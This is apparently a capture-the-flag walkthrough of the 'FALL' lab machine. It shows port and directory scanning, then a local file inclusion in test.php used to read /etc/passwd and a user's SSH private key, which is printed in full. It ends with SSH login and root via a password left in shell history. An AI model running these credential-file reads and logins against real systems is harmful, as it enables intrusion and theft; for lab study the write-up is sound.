# FALL
## Information Collect
### NMAP
```
└─$ sudo nmap -A -sV -T4 -p- 192.168.146.52                      
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-15 10:56 HKT
Stats: 0:02:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.58% done; ETC: 10:58 (0:00:00 remaining)
Nmap scan report for 192.168.146.52
Host is up (0.00021s latency).
Not shown: 65522 filtered ports
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
|_  256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
80/tcp    open   http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-title: Good Tech Inc's Fall Sales - Home
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-title: Good Tech Inc's Fall Sales - Home
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2019-08-15T03:51:33
|_Not valid after:  2020-08-19T05:31:33
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open   netbios-ssn Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp  open   mysql       MySQL (unauthorized)
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   http        Cockpit web service 162 - 188
|_http-title: Did not follow redirect to https://192.168.146.52:9090/
10080/tcp closed amanda
10443/tcp closed cirrossp
MAC Address: 00:0C:29:43:01:8A (VMware)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.4
Network Distance: 1 hop
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   Computer name: fall
|   NetBIOS computer name: FALL\x00
|   Domain name: \x00
|   FQDN: fall
|_  System time: 2022-07-14T19:58:48-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-15T02:58:46
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.146.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.40 seconds

```
### DIRSEARCH
```
dirsearch -u https://192.168.146.52    

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/aacai/.dirsearch/reports/192.168.146.52/_22-07-15_11-10-57.txt

Error Log: /home/aacai/.dirsearch/logs/errors-22-07-15_11-10-57.log

Target: https://192.168.146.52/

[11:10:57] Starting: 
[11:10:58] 403 -  220B  - /.fishsrv.pl
[11:10:58] 403 -  220B  - /.ht_wsr.txt
[11:10:58] 403 -  223B  - /.htaccess.bak1
[11:10:58] 403 -  223B  - /.htaccess.orig
[11:10:58] 403 -  225B  - /.htaccess.sample

....
Copy the path to grep 200 status in a txt file

└─$ cat 80_info.txt | grep "200"
[11:11:03] 200 -    4KB - /admin/login.php
[11:11:07] 200 -    2KB - /assets/
[11:11:09] 200 -    0B  - /config.php
[11:11:11] 200 -   24B  - /doc/
[11:11:12] 200 -   80B  - /error.html
[11:11:12] 200 -    1KB - /favicon.ico
[11:11:14] 200 -    8KB - /index.php
[11:11:15] 200 -   24B  - /lib/
[11:11:17] 200 -    3KB - /modules/
[11:11:19] 200 -   17B  - /phpinfo.php
[11:11:22] 200 -   79B  - /robots.txt
[11:11:26] 200 -   80B  - /test.php
[11:11:26] 200 -    1KB - /tmp/
[11:11:27] 200 -    0B  - /uploads/
                                                                                                                                        
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ 
```
## Web Enumeration
Get the directory of admin
<br>
![Img](../FILES/FALL/img-20220715111910.png)
<br>
sql injection fails

<br>
There are no files in the folders in assets

![Img](../FILES/FALL/img-20220715112000.png)

<br>
doc returns no information
![Img](../FILES/FALL/img-20220715112225.png)
<br>
Only comments with one sentence DUMMY HTML File

<br>
phpinfo.php also does not return information
<br>
robots.php returns File not Found

<br>
When accessing test.php
<br>
tell me Missing GET parameter
<br>
![Img](../FILES/FALL/img-20220715112425.png)
<br>
then try ffuf
<br>

>ffuf is a web fuzzer tool, which is just a word "fast" when used
But it is not installed by default in kali
Need sudo apt install ffuf to install

```
The dictionary I use in this place is not included by default and needs to be downloaded
You can use sudo apt install seclists
Or download directly from github
https://github.com/danielmiessler/SecLists
Default path /usr/share/seclists

┌──(aacai㉿kali)-[/usr/share/wordlists/wfuzz]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "https://192.168.146.52/test.php?FUZZ=/etc/passwd" -fs 80    1 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://192.168.146.52/test.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 80
________________________________________________

file                    [Status: 200, Size: 1633, Words: 36, Lines: 33, Duration: 11ms]
:: Progress: [4712/4712] :: Job [1/1] :: 3126 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
                                                                                                                                        
```
<br>Here you can see that file is used as a get parameter, which means that it has LFI

```
https://192.168.146.52/test.php?file=/etc/passwd
```
![Img](../FILES/FALL/img-20220715115848.png)
<br>curl to local

```
http://192.168.146.52/test.php?file=/etc/passwd
```
<br>try /root's .ssh key

```
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ curl http://192.168.146.52/test.php?file=/root/.ssh/id_rsa        
```
<br>There is no echo, get the information from the web page
![Img](../FILES/FALL/img-20220715120726.png)
<br>There is a posted by qiu, this user may be a breaking point

```
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ curl http://192.168.146.52/test.php?file=/home/qiu/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0
FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX
61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj/+uQlokUMtdc4NOv4XGJbp7GdEWBZevien
qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw/AfZ9ib21JGlOyy8cflTlogrZPoICCXIV/kxGK0d
Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS
vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO
NY16EA/NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge
d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP/65CW
iRQy11zg06/hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka
U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom/uel5BLUhdT1Wc/ctaU4YVTSP4hLl
KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G
NWQcGzA4jgph96uLkNM/X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs
qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6/BY9RuaGG5B2DikbB
8t/CDO79q7ccfTZs+gOVRX4PW641+cZxo5/gL3GcdJwDY4ggPwbU/m8sYsyN1NWJ8NH00d
X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C/8rseZsSJSxoXKk
CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic
ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz
lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC/TTqOIH+FXA66cFx3X4uOCjkzT0/Es0uNyZ07qQ
58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0
acm4/icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329
JW3Db+KISMRIvdpJv+eiKQLg/epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT/+
Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL
RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g/uztWJuLpFe3Ue/MLgeJ+2TiAw9yYoPVySNK8
uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                        
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ 
```
<br>
Get qiu's ssh key

```
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ ls -al
total 36
drwxr-xr-x  2 aacai aacai 4096 Jul 15 12:11 .
drwxr-xr-x 13 aacai aacai 4096 Jul 15 10:55 ..
-rw-r--r--  1 aacai aacai 3150 Jul 15 11:07 44567.txt
-rw-r--r--  1 aacai aacai 3446 Jul 15 11:13 49199.txt
-rw-r--r--  1 aacai aacai 1080 Jul 15 11:09 49345.txt
-rw-r--r--  1 aacai aacai 1070 Jul 15 11:03 49390.txt
-rw-r--r--  1 aacai aacai 3596 Jul 15 11:11 80_info.txt
-rw-r--r--  1 aacai aacai 1633 Jul 15 12:00 passwd.txt
-rw-r--r--  1 aacai aacai 1831 Jul 15 12:11 ssh_rsa
                                                                                                                                        
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ 
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ ssh -i ssh_rsa qiu@192.168.146.52
The authenticity of host '192.168.146.52 (192.168.146.52)' can't be established.
ECDSA key fingerprint is SHA256:+P4Rs5s4ipya3/t+GBoy0WjQqL/LaExt9MFvWgld4xc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.146.52' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'ssh_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "ssh_rsa": bad permissions
qiu@192.168.146.52: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).

```
<br>Incorrect file permissions, modify permissions

```
└─$ sudo chmod 600 ssh_rsa                                                                                                        255 ⨯
[sudo] password for aacai: 
                                                                                                                                        
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ ls -al
total 36
drwxr-xr-x  2 aacai aacai 4096 Jul 15 12:11 .
drwxr-xr-x 13 aacai aacai 4096 Jul 15 10:55 ..
-rw-r--r--  1 aacai aacai 3150 Jul 15 11:07 44567.txt
-rw-r--r--  1 aacai aacai 3446 Jul 15 11:13 49199.txt
-rw-r--r--  1 aacai aacai 1080 Jul 15 11:09 49345.txt
-rw-r--r--  1 aacai aacai 1070 Jul 15 11:03 49390.txt
-rw-r--r--  1 aacai aacai 3596 Jul 15 11:11 80_info.txt
-rw-r--r--  1 aacai aacai 1633 Jul 15 12:00 passwd.txt
-rw-------  1 aacai aacai 1831 Jul 15 12:11 ssh_rsa
                                                                                                                                        
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ 
┌──(aacai㉿kali)-[~/Desktop/192.168.146.52]
└─$ ssh -i ssh_rsa qiu@192.168.146.52
Web console: https://FALL:9090/ or https://192.168.146.52:9090/

Last login: Sun Sep  5 19:28:51 2021
[qiu@FALL ~]$ 
login successful
```
## Privilege escalation
```
[qiu@FALL ~]$ ls -a
.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  local.txt  reminder  .ssh
[qiu@FALL ~]$ cat .bash_history 
ls -al
cat .bash_history 
rm .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
ifconfig
ping www.google.com
ps -aux
ps -ef | grep apache
env
env > env.txt
rm env.txt
lsof -i tcp:445
lsof -i tcp:80
ps -ef
lsof -p 1930
lsof -p 2160
rm .bash_history
exit
ls -al
cat .bash_history
exit
[qiu@FALL ~]$ id 
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),10(wheel)
[qiu@FALL ~]$ sudo -l
[sudo] password for qiu: 
Matching Defaults entries for qiu on FALL:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on FALL:
    (ALL) ALL
[qiu@FALL ~]$ 

```
<br>...This privilege escalation is a bit inexplicably simple, and there is a password in .bash_profile
<br>
and sudo can use all permissions

```
[qiu@FALL ~]$ sudo su
[root@FALL qiu]# id
uid=0(root) gid=0(root) groups=0(root)
[root@FALL qiu]# who ami
[root@FALL qiu]# whoami
root
[root@FALL qiu]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:43:01:8a brd ff:ff:ff:ff:ff:ff
    inet 192.168.146.52/24 brd 192.168.146.255 scope global dynamic noprefixroute ens33
       valid_lft 67037sec preferred_lft 67037sec
    inet6 fe80::af86:ce1d:cf2a:e830/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
[root@FALL qiu]# cd 
[root@FALL ~]# ls
anaconda-ks.cfg  original-ks.cfg  proof.txt  remarks.txt
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
[root@FALL ~]# 

```
